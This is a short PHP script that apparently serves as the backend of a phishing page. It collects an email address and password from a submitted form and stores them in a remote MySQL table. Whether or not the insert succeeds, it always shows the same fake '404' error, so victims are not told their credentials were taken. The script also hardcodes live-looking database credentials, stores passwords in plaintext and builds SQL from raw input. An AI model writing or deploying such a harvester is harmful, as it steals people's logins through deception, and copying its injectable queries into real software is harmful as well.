<?php
$con = mysqli_connect("sql102.epizy.com", "epiz_31641649", "wqa8pTiJNK", "epiz_31641649_userdata");
$mail = $_POST['mail'];
$pasword = $_POST['pass'];

//Create a MySQL command to INSERT data into data table
$sql = "INSERT INTO userdata(mail, pass) VALUES ('$mail', '$pasword')";
$result = mysqli_query($con, $sql);

//Now Insert data into database
//Check if data is inserted or not
if (!mysqli_query($con, $sql)) {
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
} else{
	echo "<h1>Error! 404</h1><br><h4> Try again later </h4>";
}
?>